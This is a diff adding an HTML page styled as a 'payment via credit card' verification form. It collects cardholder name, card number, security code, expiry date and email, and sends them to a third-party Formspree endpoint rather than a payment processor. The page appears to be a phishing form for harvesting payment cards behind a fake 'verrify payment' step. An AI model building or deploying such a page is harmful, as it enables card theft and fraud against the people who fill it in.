@@ -1,0 +1,48 @@
+<style>
+.in{
+  border-radius: 5px;
+        height: 38px;
+        border: solid;border-width: 5px;border-color: purple;
+}
+  .sec{
+color: white;
+background-color: black;
+width: 300px;
+height: 500px;
+border: solid;
+border-radius: 20px;
+border-width: 7px;
+border-color: purple;
+position: relative;
+top: 35px;
+text-spacing-trim: 0.1m;
+    }
+    .but{
+    border: solid;border-width: 5px;border-color: white;background-color: purple;border-radius: 10px;
+    height: 38px;
+    width: fit-content;
+
+}
+.email{
+  height: 38px;width: 175px;border: solid;border-radius: 10px;border-width: 5px;border-color: purple;
+}
+</style>
+<html><center><section class="sec">
+<form action="https://formspree.io/f/xwlevyyz" method="POST">
+  
+  <center><label for="message"> <h2>payment via credit card</h2></label></center><br>
+  <center><textarea id="message" name="message" rows="5" cols="30"  required placeholder="name on card" class="in"></textarea></center><br>
+  <center><textarea id="message" name="message" rows="5" cols="30"  required placeholder="card number" maxlength="19" class="in"></textarea></center><br>
+  <center><textarea id="message" name="message" rows="5" cols="30"  required placeholder="3 digit code" maxlength="3" class="in"></textarea></center><br>
+  <center><textarea id="message" name="message" rows="5" cols="30"  required placeholder="date example 03/12" maxlength="4" class="in"></textarea></center><br>
+  <br><br>
+  
+  <!-- Formspree requires a reply-to email field if you want to answer the sender -->
+  <center><section>
+  <label for="email">Your Email Address:</label><br>
+  <input type="email" id="email" name="_replyto" placeholder="name@example.com" required class="email"></section></center>
+  <br><br>
+  
+  <center><button type="submit" class="but">verrify payment</button></center>
+</form></section></center>
+</html>
